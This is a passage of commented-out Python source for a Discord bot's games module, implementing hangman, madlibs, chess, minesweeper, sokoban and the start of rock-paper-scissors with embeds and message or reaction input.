#       right_arm = "\\" if errors > 3 else " "
#       left_leg = "/" if errors > 4 else " "
#       right_leg = "\\" if errors > 5 else " "
#       return (
#           f"```\n {head}\n{left_arm}{torso}{right_arm}\n {left_leg}{right_leg}\n```"
#       )

#   def _show_guesses(self, embed, guesses):
#       """Show all the guesses made so far"""
#       if guesses:
#           embed.add_field(
#               name="Guesses",
#               value="".join(f":regional_indicator_{i}:" for i in guesses),
#               inline=False,
#           )

#   @commands.command("hangman", aliases=["hm"])
#   async def command(self, ctx: commands.Context, member:discord.Member):
#       if member.bot or member == ctx.author:
#           return await ctx.send(
#               f"Invalid Syntax: Can't play against {member.display_name}"
#           )
#       if self.player_ingame(ctx.author):
#           return await ctx.send("You're already in a game")
#       if self.player_ingame(member):
#           return await ctx.send(f"{member.display_name} is already in a game")
#       await ctx.send(f'Do you accept {ctx.author.mention}\'s challenge? (type yes or no)')
#       msg = await self.bot.wait_for('message', check = lambda m: m.author == member and m.content.lower() in ['no','yes'])
#       if msg.content.lower() == 'no':
#           return
#       self.dct[member] = True
#       self.dct[ctx.author] = True
#       word = await self._get_word()
#       word = str(word).replace("\n", "")
#       word = list(word)

#       guesses = []
#       errors = 0
#       revealed_message = "🟦 " * len(word)
#       embed = discord.Embed(color=discord.Color.blurple())
#       embed.add_field(name="Hangman", value=self.make_hangman(errors), inline=False)
#       embed.add_field(
#           name="Word",
#           value="".join(revealed_message.split(" ")),
#           inline=False,
#       )
#       msg = await ctx.send(embed=embed)

#       while True:
#           embed = discord.Embed(color=discord.Color.blurple())
#           embed.add_field(
#               name="Word",
#               value="".join(f":regional_indicator_{i}:" for i in word),
#               inline=False,
#           )
#           try:
#               message: discord.Message = await ctx.bot.wait_for(
#                   "message",
#                   check=lambda m: m.author in [ctx.author, member] and m.channel == ctx.channel,
#                   timeout=45
#               )
#           except asyncio.TimeoutError:
#               return await ctx.send("Timed out")
#           if message.content.lower() in ["end", "stop", "cancel"]:
#               await self.end_game(ctx, member if message.author == ctx.author else ctx.author, message.author)
#               return await ctx.send("Ended the game")

#           if message.content in guesses:
#               await ctx.send("You already guessed that", delete_after=5)
#               continue

#           if len(message.content.lower()) > 1:
#               if message.content.lower() == "".join(word):
#                   embed.add_field(
#                       name="Hangman",
#                       value=self.make_hangman(errors),
#                       inline=False,
#                   )
#                   self._show_guesses(embed, guesses)
#                   embed.add_field(name="Result:", value="You've won!", inline=False)
#                   await self.end_game(ctx, message.author, member if message.author == ctx.author else ctx.author)
#                   return await msg.edit(embed=embed)
#               else:
#                   errors += 1
#                   await ctx.send("Uhoh, that was not the word", delete_after=5)
#                   embed = discord.Embed(color=discord.Color.blurple())
#                   embed.add_field(
#                       name="Hangman",
#                       value=self.make_hangman(errors),
#                       inline=False,
#                   )
#                   embed.add_field(
#                       name="Word",
#                       value="".join(revealed_message.split(" ")),
#                       inline=False,
#                   )
#                   self._show_guesses(embed, guesses)
#                   await msg.edit(embed=embed)
#                   if errors == 6:
#                       embed = discord.Embed(color=discord.Color.blurple())
#                       embed.add_field(
#                           name="Hangman",
#                           value=self.make_hangman(errors),
#                           inline=False,
#                       )
#                       self._show_guesses(embed, guesses)
#                       embed.add_field(
#                           name="Result:",
#                           value=f"You lost :pensive:\n word was {''.join(word)}",
#                           inline=False,
#                       )
#                       self.dct[turn] = False
#                       self.dct[member if turn == ctx.author else ctx.author] = False
#                       return await msg.edit(embed=embed)
#           elif message.content.lower().isalpha():
#               guesses.append(message.content)
#               if message.content.lower() not in word:
#                   errors += 1
#               if errors == 6:
#                   embed = discord.Embed(color=discord.Color.blurple())
#                   embed.add_field(
#                       name="Hangman",
#                       value=self.make_hangman(errors),
#                       inline=False,
#                   )
#                   self._show_guesses(embed, guesses)
#                   embed.add_field(
#                       name="Result:",
#                       value=f"You lost :pensive:\n word was {''.join(word)}",
#                       inline=False,
#                   )
#                   self.dct[turn] = False
#                   self.dct[member if turn == ctx.author else ctx.author] = False
#                   return await msg.edit(embed=embed)
#               revealed_message = revealed_message.split(" ")
#               for i in range(len(word)):
#                   if word[i] == message.content.lower():
#                       revealed_message[i] = f":regional_indicator_{word[i]}:"
#               revealed_message = " ".join(revealed_message)
#               if "🟦 " not in revealed_message:
#                   embed.add_field(
#                       name="Hangman",
#                       value=self.make_hangman(errors),
#                       inline=False,
#                   )
#                   self._show_guesses(embed, guesses)
#                   embed.add_field(name="Result:", value="You've won!", inline=False)
#                   await self.end_game(ctx, message.author, member if message.author == ctx.author else ctx.author)
#                   return await msg.edit(embed=embed)
#               else:
#                   embed = discord.Embed(color=discord.Color.blurple())
#                   embed.add_field(
#                       name="Hangman",
#                       value=self.make_hangman(errors),
#                       inline=False,
#                   )
#                   embed.add_field(
#                       name="Word",
#                       value="".join(revealed_message.split(" ")),
#                       inline=False,
#                   )
#                   self._show_guesses(embed, guesses)
#                   await msg.edit(embed=embed)
#           else:
#               await ctx.send(
#                   f"Invalid Syntax: {message.content.lower()} is not a letter"
#               )

#   @property
#   def url(self):
#       return "http://madlibz.herokuapp.com/api/random"

#   @property
#   def session(self):
#       return self.bot.http._HTTPClient__session

#   async def request(self, min: int, max: int):
#       """Returns the json containing the game"""
#       params = {"minlength": min, "maxlength": max}
#       response = await self.session.get(self.url, params=params)
#       return await response.json()

#   @commands.command()
#   async def madlib(self, ctx, min: int = 5, max: int = 25):
#       if self.player_ingame(ctx.author):
#           return await ctx.send("You're already in a game")
#       self.dct[ctx.author] = True
#       json = await self.request(min, max)
#       lst = []
#       try:
#           for question in json["blanks"]:
#               await ctx.reply(f"Please send: {question}", mention_author=False)
#               answer = await ctx.bot.wait_for(
#                   "message",
#                   check=lambda m: m.author == ctx.author and m.channel == ctx.channel,
#               )
#               lst.append(answer.content)
#           madlib = json["value"]
#           string = " ".join(
#               f'{madlib[i]}{lst[i] if len(lst)-1 >= i else ""}'
#               for i in range(len(madlib) - 1)
#           )
#           await ctx.send(string)
#       except KeyError:
#           return await ctx.send(f"Invalid syntax: invalid arguments entered")

#   def has_won_chess(self, board, member):
#       """Checks if game is over"""
#       value = None
#       results = board.result()
#       if board.is_checkmate():
#           value = f"Checkmate, Winner: {member.mention} | Score: `{results}`"
#       elif board.is_stalemate():
#           value = f"Stalemate | Score: `{results}`"
#       elif board.is_insufficient_material():
#           value = (
#               f"Insufficient material left to continue the game | Score: `{results}`"
#           )
#       elif board.is_seventyfive_moves():
#           value = f"75-moves rule | Score: `{results}`"
#       elif board.is_fivefold_repetition():
#           value = f"Five-fold repitition. | Score: `{results}`"
#       return value

#   def create_chess_board(self, board, turn, member):
#       """Creates the chess embed"""
#       url = f"http://www.fen-to-image.com/image/64/double/coords/{board.board_fen()}"
#       e = discord.Embed(
#           title="Chess",
#           description="To move a piece get it's current coordinates and the coordinates of where you want it to be, eg: `a2a4`",
#           color=discord.Color.blurple(),
#       )
#       e.add_field(name="Turn", value=turn.mention, inline=False)
#       e.add_field(
#           name=f"Legal moves",
#           value=", ".join([f"`{str(i)}`" for i in board.legal_moves]) or 'No legal moves',
#           inline=False,
#       )
#       e.add_field(name="Check", value=board.is_check(), inline=False)
#       if board.halfmove_clock >= 45:
#           e.add_field(name="Half move clock", value=board.halfmove_clock)
#       gameOver = self.has_won_chess(board, member)
#       if gameOver:
#           e.description = "GAME OVER"
#           e.add_field(name="Winner", value=gameOver)
#       e.set_image(url=url)
#       e.set_footer(
#           text='Send "end"/"stop"/"cancel" to stop the game | "back" to go back a step | "re"/"re-send"/"resend" to send a new embed'
#       )
#       return e

#   @commands.command("chess")
#   async def chess(self, ctx, member: discord.Member):
#       """a board game of strategic skill for two players, played on a chequered board on which each playing piece is moved according to precise rules. The object is to put the opponent's king under a direct attack from which escape is impossible"""
#       if member.bot or member == ctx.author:
#           return await ctx.send(
#               f"Invalid Syntax: Can't play against {member.display_name}"
#           )
#       else:
#           if self.player_ingame(ctx.author):
#               return await ctx.send("You're already in a game")
#           if self.player_ingame(member):
#               return await ctx.send(f"{member.display_name} is already in a game")
#           await ctx.send(f'Do you accept {ctx.author.mention}\'s challenge? (type yes or no)')
#           msg = await self.bot.wait_for('message', check = lambda m: m.author == member and m.content.lower() in ['no','yes'])
#           if msg.content.lower() == 'no':
#               return
#           self.dct[member] = True
#           self.dct[ctx.author] = True
#           board = chess.Board()
#           turn = ctx.author
#           e = self.create_chess_board(
#               board, turn, member if turn == ctx.author else ctx.author
#           )
#           msg = await ctx.send(embed=e)
#           while True:
#               def check(m):
#                   try:
#                       if board.parse_uci(m.content.lower()) or m.content.lower() in ['end','stop','cancel','re','re-send','resend','back']:
#                           return m.author == turn and m.channel == ctx.channel
#                       else:
#                           return False
#                   except ValueError:
#                       return m.content.lower() in ['end','stop','cancel','re','re-send','resend','back']
#               try:
#                   inp = await ctx.bot.wait_for(
#                       "message",
#                       check=check,
#                       timeout = 45
#                   )
#               except asyncio.TimeoutError:
#                   return await ctx.send("Timed out")
#               if inp.content.lower() in ["stop", "end", "cancel"]:
#                   await self.end_game(ctx, member if inp.author == ctx.author else ctx.author, inp.author)
#                   return await ctx.send("Game ended", delete_after=5)
#               elif inp.content.lower() == "back":
#                   try:
#                       board.pop()
#                   except IndexError:
#                       await ctx.send("Can't go back", delete_after=5)
#                       continue
#               elif inp.content.lower() in ['re','re-send','resend']:
#                   e = self.create_chess_board(board, turn, member if turn == ctx.author else ctx.author)
#                   msg = await ctx.send(embed=e)
#                   continue
#               else:
#                   if inp.author == turn:
#                       board.push_uci(inp.content.lower())
#                       try:
#                           await inp.delete()
#                       except discord.Forbidden:
#                           pass
#                   else:
#                       continue
#               turn = member if turn == ctx.author else ctx.author
#               won = self.has_won_chess(
#                   board, member if turn == ctx.author else ctx.author
#               )
#               if won:
#                   e = self.create_chess_board(
#                       board, turn, member if turn == ctx.author else ctx.author
#                   )
#                   await self.end_game(ctx, inp.author, member if inp.author == ctx.author else ctx.author)
#                   return await ctx.send(embed=e)
#               e = self.create_chess_board(
#                   board, turn, member if turn == ctx.author else ctx.author
#               )
#               await msg.edit(embed=e)

#   def create_minesweeper_boards(self):
#       """Creates 2 minesweeper boards"""
#       board = [
#           ["b" if random.random() <= .14 else "n" for _ in range(10)]
#           for _ in range(10)
#       ]
#       board[random.randint(0, 9)][random.randint(0, 9)] = "n"
#       for x, row in enumerate(board):
#           for y, cell in enumerate(row):
#               if cell == "n":
#                   bombs = 0
#                   for x_, y_ in self.get_neighbours(x, y):
#                       try:
#                           if board[x_][y_] == "b":
#                               bombs += 1
#                       except IndexError:
#                           pass
#                   board[x][y] = bombs

#       visible_board = [[" " for _ in range(10)] for _ in range(10)]
#       return board, visible_board

#   def get_coors(self, coordinate):
#       """Returns x,y coordinates based on the coordinates entered by the author"""
#       if len(coordinate) not in (2, 3):
#           raise commands.BadArgument("Invalid syntax: invalid coordinate provided.")

#       coordinate = coordinate.lower()
#       if coordinate[0].isalpha():
#           digit = coordinate[1:]
#           letter = coordinate[0]
#       else:
#           digit = coordinate[:-1]
#           letter = coordinate[-1]

#       if not digit.isdecimal():
#           raise commands.BadArgument("Invalid syntax: invalid coordinate provided.")

#       x = int(digit) - 1
#       y = ord(letter) - ord("a")

#       if (not x in range(10)) or (not y in range(10)):
#           raise commands.BadArgument(
#               "Invalid syntax: Entered coordinates aren't on the board"
#           )
#       return x, y

#   def format_minesweeper_board(self, board):
#       """Format the minesweeper board"""
#       dct = {"b": "💣", "f": "🚩", " ": "🟦", "0": "⬛", "10": "🔟","x":"❌"}
#       for i in range(1, 10):
#           dct[str(i)] = f"{i}\N{variation selector-16}\N{combining enclosing keycap}"
#       lst = [
#           f":stop_button::regional_indicator_a::regional_indicator_b::regional_indicator_c::regional_indicator_d::regional_indicator_e::regional_indicator_f::regional_indicator_g::regional_indicator_h::regional_indicator_i::regional_indicator_j:"
#       ]
#       for num, row in enumerate(board, start=1):
#           lst.append(dct[str(num)]+''.join([dct[str(column)] for column in row]))
#       return "\n".join(lst)

#   def get_bombs(self, board):
#       """Returns a list with every x,y coordinates of every bomb on the board"""
#       lst = []
#       for x in range(len(board)):
#           for y in range(len(board[x])):
#               if board[x][y] == "b":
#                   lst.append(f"{x}{y}")
#       return lst

#   def get_neighbours(self, x, y):
#       """yields every x,y coordinate around the `x` and `y`"""
#       for x_ in [x - 1, x, x + 1]:
#           for y_ in [y - 1, y, y + 1]:
#               if x_ != -1 and x_ != 11 and y_ != -1 and y_ != 11:
#                   yield x_, y_

#   def reveal_zeros(self, visible_board, grid, x, y):
#       """reveals every zero around `x``y`"""
#       for x_, y_ in self.get_neighbours(x, y):
#           try:
#               if visible_board[x_][y_] != " ":
#                   continue
#               visible_board[x_][y_] = str(grid[x_][y_])
#               if grid[x_][y_] == 0:
#                   self.reveal_zeros(visible_board, grid, x_, y_)
#           except IndexError:
#               pass
#       return visible_board

#   def has_won_minesweeper(self, visible_board, board):
#       """Checks if the author has won"""
#       num = 0
#       bombs = self.get_bombs(board)
#       for x, row in enumerate(board):
#           for y, column in enumerate(row):
#               if visible_board[x][y] == column:
#                   num += 1
#       if num == ((len(board) * len(board[0])) - len(bombs)):
#           return True

#       for bomb in bombs:
#           if not visible_board[int(bomb[0])][int(bomb[1])] == "f":
#               return False
#       return True

#   def reveal_all(self, visible_board, board):
#       for x in range(len(visible_board)):
#           for y in range(len(visible_board[x])):
#               if visible_board[x][y] == " ":
#                   visible_board[x][y] = board[x][y]
#               elif visible_board[x][y] == 'f':
#                   if not board[x][y] == 'b':
#                       visible_board[x][y] = 'x'
#       return visible_board

#   @commands.command(aliases=["ms"])
#   async def minesweeper(self, ctx):
#       """a square board containing hidden "mines" or bombs without detonating any of them, with help from clues about the number of neighbouring mines in each field."""
#       if self.player_ingame(ctx.author):
#           return await ctx.send("You're already in a game")
#       self.dct[ctx.author] = True
#       grid, visible_board = self.create_minesweeper_boards()
#       flags = len(self.get_bombs(grid))
#       # await ctx.send(self.format_minesweeper_board(self.reveal_all(visible_board, grid)))

#       em = discord.Embed(
#           title="Minesweeper",
#           description=f"to reveal a place send the coordinates, eg: `reveal d5 7a 3h`\nto flag a place send the coordinates, eg: `flag d5 7a 3h`\n\nFlags: `{flags}`\n{self.format_minesweeper_board(visible_board)}",
#           color=discord.Color.blurple(),
#       ).set_footer(text='Send "end"/"stop"/"cancel" to stop the game | "re"/"re-send"/"resend" to resend the embed')
#       msg = await ctx.send(embed=em)
#       while True:
#           try:
#               inp = await self.bot.wait_for(
#                   "message",
#                   check=lambda m: m.author == ctx.author and m.channel == ctx.channel,
#                   timeout=45
#               )
#           except asyncio.TimeoutError:
#               return await ctx.send("Timed out")
#           try:
#               await inp.delete()
#           except discord.Forbidden:
#               pass
#           if inp.content.lower() in ["end", "stop", "cancel"]:
#               return await ctx.send("Ended the game")
#           elif inp.content.lower() in ['re','re-send','resend']:
#               msg = await ctx.send(embed=em)
#               continue
#           lst = inp.content.split()
#           type_ = lst[0]
#           xy = lst[1:]
#           for coors in xy:
#               try:
#                   x, y = self.get_coors(coors)
#               except Exception as e:
#                   await ctx.send(e)
#                   continue
#               if type_.lower() in ["reveal", "r"]:
#                   if grid[x][y] == "b":
#                       return await ctx.send(
#                           f"{ctx.author.mention} just lost Minesweeper! :pensive:",
#                           embed=discord.Embed(
#                               title="Minesweeper",
#                               description=self.format_minesweeper_board(
#                                   self.reveal_all(visible_board, grid)
#                               ),
#                               color=discord.Color.blurple(),
#                           ),
#                       )
#                   else:
#                       if visible_board[x][y] not in [" ","f"]:
#                           await ctx.send(
#                               f"Invalid Syntax: {coors} is already revealed",
#                               delete_after=5,
#                           )
#                           continue
#                       visible_board[x][y] = str(grid[x][y])
#                       if visible_board[x][y] == "0":
#                           visible_board = self.reveal_zeros(visible_board, grid, x, y)
#               elif type_.lower() in ["flag", "f"]:
#                   if visible_board[x][y] != " ":
#                       await ctx.send(
#                           f"Invalid syntax: {coors} is already revealed or flagged",
#                           delete_after=5,
#                       )
#                       continue
#                   visible_board[x][y] = "f"
#                   flags -= 1
#               else:
#                   await ctx.send(
#                       f"Invalid syntax: {type_} isnt a valid move type",
#                       delete_after=5,
#                   )
#           if self.has_won_minesweeper(visible_board, grid):
#               em = discord.Embed(
#                   title="Minesweeper",
#                   description=self.format_minesweeper_board(
#                       self.reveal_all(visible_board, grid)
#                   ),
#                   color=discord.Color.blurple(),
#               )
#               await ctx.send(
#                   f":tada: {ctx.author.mention} just won Minesweeper! :tada:",
#                   embed=em,
#               )
#               return
#           em = discord.Embed(
#               title="Minesweeper",
#               description=f"to reveal a place send the coordinates, eg: `reveal d5 7a 3h`\nto flag a place send the coordinates, eg: `flag d5 7a 3h`\n\nFlags: `{flags}`\n{self.format_minesweeper_board(visible_board)}",
#               color=discord.Color.blurple(),
#           ).set_footer(text='Send "end"/"stop"/"cancel" to stop the game | "re"/"re-send"/"resend" to resend the embed')
#           await msg.edit(embed=em)

#   def format_soko_board(self, board):
#       """Format the soko board"""
#       dct = {
#           "p": ":flushed:",
#           " ": random.choice(
#               [
#                   ":purple_square:",
#                   ":black_large_square:",
#                   ":green_square:",
#                   ":yellow_square:",
#                   ":blue_square:",
#               ]
#           ),
#           "tp": ":flushed:",
#           "tb": ":white_check_mark:",
#           "t": ":x:",
#           "b": ":brown_square:",
#       }
#       lst = []
#       for i in board:
#           scn_lst = []
#           for thing in i:
#               scn_lst.append(dct[thing])
#           lst.append("".join(scn_lst))
#       return "\n".join(lst)

#   def create_soko_board(self, difficulty_level):
#       """Creates the soko board based on the difficulty level"""
#       num1 = 8 - difficulty_level // 4
#       num2 = 8 - difficulty_level // 4
#       if num1 >= 5:
#           num1 = random.randint(5, 9)
#           num2 = random.randint(5, 9)
#       num3 = 1 + difficulty_level // 5
#       if num3 > 7:
#           num3 = 7
#       board = [[" " for i in range(num1)] for i in range(num2)]
#       x, y = random.randint(0, len(board) - 1), random.randint(0, len(board[0]) - 1)
#       board[x][y] = "p"
#       for _ in range(num3):
#           for i in ["t", "b"]:
#               if i == "b":
#                   x, y = random.randint(1, len(board) - 2), random.randint(
#                       1, len(board[0]) - 2
#                   )
#               else:
#                   x, y = random.randint(0, len(board) - 1), random.randint(
#                       0, len(board[0]) - 1
#                   )
#               while board[x][y] != " ":
#                   if i == "b":
#                       x, y = random.randint(1, len(board) - 2), random.randint(
#                           1, len(board[0]) - 2
#                       )
#                   else:
#                       x, y = random.randint(0, len(board) - 1), random.randint(
#                           0, len(board[0]) - 1
#                       )
#               board[x][y] = i
#       return board

#   def get_player(self, board):
#       """Returnes the x,y coordinates of the player"""
#       for x, i in enumerate(board):
#           for y, thing in enumerate(i):
#               if thing == "p" or thing == "tp":
#                   return x, y

#   def has_won_soko(self, board):
#       """Checks if there are no more t on the board"""
#       for x in board:
#           for y in x:
#               if y == "t" or y == "tp":
#                   return False
#       return True

#   @commands.command(aliases=["soko"])
#   async def sokoban(self, ctx):
#       """the player pushes boxes around the board, trying to get them to :x:"""
#       if self.player_ingame(ctx.author):
#           return await ctx.send("You're already in a game")
#       self.dct[ctx.author] = True
#       diff_level = 0
#       directions = directions = {
#           "⬆️": "up",
#           "⬅️": "left",
#           "➡️": "right",
#           "⬇️": "down",
#           "🔄": "reset",
#           "⏹️": "end",
#       }
#       msg = await ctx.send("Setting up the game")
#       while True:
#           board = self.create_soko_board(diff_level)
#           origin_board = copy.deepcopy(board)
#           em = discord.Embed(
#               title="Sokoban",
#               description=self.format_soko_board(board),
#               color=discord.Color.blurple(),
#           ).set_footer(
#               text='React with "⏹️" to end the game | React with "🔄" to restart the level'
#           )
#           em.add_field(
#               name="Play",
#               value=f"Score: {diff_level}\nReact with a direction (up :arrow_up:, down :arrow_down:, right :arrow_right:, left :arrow_left:)",
#           )
#           await msg.edit(embed=em)
#           for i in ["⬆️", "⬇️", "➡️", "⬅️", "🔄", "⏹️"]:
#               await msg.add_reaction(i)
#           while True:
#               try:
#                   reaction, user = await self.bot.wait_for(
#                       "reaction_add",
#                       check=lambda r, u: u == ctx.author
#                       and r.message == msg
#                       and str(r) in ["⬆️", "⬇️", "➡️", "⬅️", "🔄", "⏹️"],
#                   )
#               except asyncio.TimeoutError:
#                   return await ctx.send("Timed out")
#               try:
#                   await msg.remove_reaction(str(reaction), user)
#               except discord.Forbidden:
#                   pass
#               inp = directions[str(reaction)]
#               if inp == "end":
#                   self.dct[ctx.author] = False
#                   await ctx.send("Ended the game")
#                   return
#               if inp == "up":
#                   try:
#                       num = self.get_player(board)
#                       if (num[0] - 1) < 0:
#                           await ctx.send("Cant go up any further", delete_after=5)
#                           continue
#                       elif board[num[0] - 1][num[1]] == "b":
#                           if (num[0] - 2) < 0:
#                               await ctx.send(
#                                   "Cant push this box up any further", delete_after=5
#                               )
#                               continue
#                           if board[num[0] - 2][num[1]] == "b":
#                               await ctx.send(
#                                   "Can't push a 2 boxes at the same time",
#                                   delete_after=5,
#                               )
#                               continue
#                           if board[num[0] - 2][num[1]] == "t":
#                               board[num[0] - 2][num[1]] = "tb"
#                           else:
#                               board[num[0] - 2][num[1]] = "b"
#                           board[num[0]][num[1]] = " "
#                           board[num[0] - 1][num[1]] = "p"
#                       elif board[num[0] - 1][num[1]] == "tb":
#                           if (num[0] - 2) < 0:
#                               await ctx.send(
#                                   "Cant push this box up any further", delete_after=5
#                               )
#                               continue
#                           if board[num[0] - 2][num[1]] == "b":
#                               await ctx.send(
#                                   "Can't push a 2 boxes at the same time",
#                                   delete_after=5,
#                               )
#                               continue
#                           if board[num[0] - 2][num[1]] == "t":
#                               board[num[0] - 2][num[1]] = "tb"
#                           else:
#                               board[num[0] - 2][num[1]] = "b"
#                           board[num[0]][num[1]] = " "
#                           board[num[0] - 1][num[1]] = "tp"
#                       else:
#                           if board[num[0]][num[1]] == "p":
#                               board[num[0]][num[1]] = " "
#                           else:
#                               board[num[0]][num[1]] = "t"
#                           if board[num[0] - 1][num[1]] == "t":
#                               board[num[0] - 1][num[1]] = "tp"
#                           else:
#                               board[num[0] - 1][num[1]] = "p"
#                   except IndexError:
#                       await ctx.send("Cant do that", delete_after=5)
#                       continue
#               elif inp == "down":
#                   try:
#                       num = self.get_player(board)
#                       if (num[0] + 1) > len(board) - 1:
#                           await ctx.send("Cant go down any further", delete_after=5)
#                           continue
#                       elif board[num[0] + 1][num[1]] == "b":
#                           if (num[0] + 2) > len(board) - 1:
#                               await ctx.send(
#                                   "Cant push this box down any further",
#                                   delete_after=5,
#                               )
#                               continue
#                           if board[num[0] + 2][num[1]] == "b":
#                               await ctx.send(
#                                   "Can't push a 2 boxes at the same time",
#                                   delete_after=5,
#                               )
#                               continue
#                           if board[num[0] + 2][num[1]] == "t":
#                               board[num[0] + 2][num[1]] = "tb"
#                           else:
#                               board[num[0] + 2][num[1]] = "b"
#                           board[num[0]][num[1]] = " "
#                           board[num[0] + 1][num[1]] = "p"
#                       elif board[num[0] + 1][num[1]] == "tb":
#                           if (num[0] + 2) < 0:
#                               await ctx.send(
#                                   "Cant push this box down any further",
#                                   delete_after=5,
#                               )
#                               continue
#                           if board[num[0] + 2][num[1]] == "b":
#                               await ctx.send(
#                                   "Can't push a 2 boxes at the same time",
#                                   delete_after=5,
#                               )
#                               continue
#                           if board[num[0] + 2][num[1]] == "t":
#                               board[num[0] + 2][num[1]] = "tb"
#                           else:
#                               board[num[0] + 2][num[1]] = "b"
#                           board[num[0]][num[1]] = " "
#                           board[num[0] + 1][num[1]] = "tp"
#                       else:
#                           if board[num[0]][num[1]] == "p":
#                               board[num[0]][num[1]] = " "
#                           else:
#                               board[num[0]][num[1]] = "t"
#                           if board[num[0] + 1][num[1]] == "t":
#                               board[num[0] + 1][num[1]] = "tp"
#                           else:
#                               board[num[0] + 1][num[1]] = "p"
#                   except IndexError:
#                       await ctx.send("Cant do that", delete_after=5)
#                       continue
#               elif inp == "left":
#                   try:
#                       num = self.get_player(board)
#                       if (num[1] - 1) < 0:
#                           await ctx.send("Cant go left any further", delete_after=5)
#                           continue
#                       elif board[num[0]][num[1] - 1] == "b":
#                           if (num[1] - 2) < 0:
#                               await ctx.send(
#                                   "Cant push this box left any further",
#                                   delete_after=5,
#                               )
#                               continue
#                           if board[num[0]][num[1] - 2] == "b":
#                               await ctx.send(
#                                   "Can't push a 2 boxes at the same time",
#                                   delete_after=5,
#                               )
#                               continue
#                           if board[num[0]][num[1] - 2] == "t":
#                               board[num[0]][num[1] - 2] = "tb"
#                           else:
#                               board[num[0]][num[1] - 2] = "b"
#                           board[num[0]][num[1]] = " "
#                           board[num[0]][num[1] - 1] = "p"
#                       elif board[num[0]][num[1] - 1] == "tb":
#                           if (num[1] - 2) < 0:
#                               await ctx.send(
#                                   "Cant push this box left any further",
#                                   delete_after=5,
#                               )
#                               continue
#                           if board[num[0]][num[1] - 2] == "b":
#                               await ctx.send(
#                                   "Can't push a 2 boxes at the same time",
#                                   delete_after=5,
#                               )
#                               continue
#                           if board[num[0]][num[1] - 2] == "t":
#                               board[num[0]][num[1] - 2] = "tb"
#                           else:
#                               board[num[0]][num[1] - 2] = "b"
#                           board[num[0]][num[1]] = " "
#                           board[num[0]][num[1] - 1] = "tp"
#                       else:
#                           if board[num[0]][num[1]] == "p":
#                               board[num[0]][num[1]] = " "
#                           else:
#                               board[num[0]][num[1]] = "t"
#                           if board[num[0]][num[1] - 1] == "t":
#                               board[num[0]][num[1] - 1] = "tp"
#                           else:
#                               board[num[0]][num[1] - 1] = "p"
#                   except IndexError:
#                       await ctx.send("Cant do that", delete_after=5)
#                       continue
#               elif inp == "right":
#                   try:
#                       num = self.get_player(board)
#                       if (num[1] + 1) > len(board[0]) - 1:
#                           await ctx.send("Cant go right any further", delete_after=5)
#                           continue
#                       elif board[num[0]][num[1] + 1] == "b":
#                           if (num[1] + 2) < 0:
#                               await ctx.send(
#                                   "Cant push this box right any further",
#                                   delete_after=5,
#                               )
#                               continue
#                           if board[num[0]][num[1] + 2] == "b":
#                               await ctx.send(
#                                   "Can't push a 2 boxes at the same time",
#                                   delete_after=5,
#                               )
#                               continue
#                           if board[num[0]][num[1] + 2] == "t":
#                               board[num[0]][num[1] + 2] = "tb"
#                           else:
#                               board[num[0]][num[1] + 2] = "b"
#                           board[num[0]][num[1]] = " "
#                           board[num[0]][num[1] + 1] = "p"
#                       elif board[num[0]][num[1] + 1] == "tb":
#                           if (num[1] + 2) < 0:
#                               await ctx.send(
#                                   "Cant push this box right any further",
#                                   delete_after=5,
#                               )
#                               continue
#                           if board[num[0]][num[1] + 2] == "b":
#                               await ctx.send(
#                                   "Can't push a 2 boxes at the same time",
#                                   delete_after=5,
#                               )
#                               continue
#                           if board[num[0]][num[1] + 2] == "t":
#                               board[num[0]][num[1] + 2] = "tb"
#                           else:
#                               board[num[0]][num[1] + 2] = "b"
#                           board[num[0]][num[1]] = " "
#                           board[num[0]][num[1] + 1] = "tp"
#                       else:
#                           if board[num[0]][num[1]] == "p":
#                               board[num[0]][num[1]] = " "
#                           else:
#                               board[num[0]][num[1]] = "t"
#                           if board[num[0]][num[1] + 1] == "t":
#                               board[num[0]][num[1] + 1] = "tp"
#                           else:
#                               board[num[0]][num[1] + 1] = "p"
#                   except IndexError:
#                       await ctx.send("Cant do that")
#                       continue
#               elif inp == "reset":
#                   board = origin_board
#                   origin_board = copy.deepcopy(board)
#               em = discord.Embed(
#                   title="Sokoban",
#                   description=self.format_soko_board(board),
#                   color=discord.Color.blurple(),
#               )
#               em.add_field(
#                   name="Play",
#                   value=f"Score: {diff_level}\nReact with a direction (up :arrow_up:, down :arrow_down:, right :arrow_right:, left :arrow_left:)",
#               )
#               await msg.edit(embed=em)
#               if self.has_won_soko(board):
#                   await ctx.send("Congrats, you won!", delete_after=10)
#                   diff_level += 1
#                   break

#   # @commands.command()
#   # async def rps(self, ctx, member:discord.Member):
#   #   if member.bot or member == ctx.author:
#   #       return await ctx.send("Invalid syntax: can't play again "+member.display_name)
#   #   if self.player_ingame(ctx.author):
#   #       return await ctx.send("You're already in a game")
#   #   if self.player_ingame(member):
#   #       return await ctx.send(f"{member.display_name} is already in a game")
#   #   await ctx.send(f'Do you accept {ctx.author.mention}\'s challenge? (type yes or no)')
#   #   try:
#   #       msg = await self.bot.wait_for('message', check = lambda m: m.author == member and m.content.lower() in ['no','yes'], timeout=45)
#   #   except asyncio.TimeoutError:
#   #       return await ctx.send("Timed out")
#   #   if msg.content.lower() == 'no':
#   #       return
#   #   self.dct[member] = True
#   #   self.dct[ctx.author] = True
#   #   view = RPSView(ctx.author, member or self.bot.user)
#   #   await ctx.send('Rock Paper Scissors', view=view)
#   #   await view.wait()
#   #   if isinstance(view.winner, str):
#   #       self.dct[ctx.author] = False
#   #       self.dct[member] = False
#   #   else:
#   #       await self.end_game(ctx, view.winner, member if view.winner == ctx.author else ctx.author)


#     def has_won_rps(self, inp1, inp2):
#         """Returns the winner"""
#         dct = {"✂️": "📜", "🪨": "✂️", "📜": "🪨"}
#         if inp1 == inp2:
#             return "Draw"
#         elif dct[inp1] == inp2:
#             return "inp1"
#         return "inp2"

#     @commands.command()
#     async def rps(self, ctx, member: discord.Member):
#         """Rock wins against scissors; paper wins against rock; and scissors wins against paper"""
#         if member.bot or member == ctx.author:
#             return await ctx.send(
#                 f"Invalid Syntax: Can't play against {member.display_name}"
#             )
#         else:
#             if self.player_ingame(ctx.author):
#                 return await ctx.send("You're already in a game")
#             if self.player_ingame(member):
#                 return await ctx.send(f"{member.display_name} is already in a game")
#             await ctx.send(f'Do you accept {ctx.author.mention}\'s challenge? (type yes or no)')
#             msg = await self.bot.wait_for('message', check = lambda m: m.author == member and m.content.lower() in ['no','yes'])
#             if msg.content.lower() == 'no':
#                 return
#             self.dct[member] = True
#             self.dct[ctx.author] = True
#         try:
#             msg1 = await ctx.author.send("Please react with your choice:")
#             for i in ["✂️", "🪨", "📜"]:
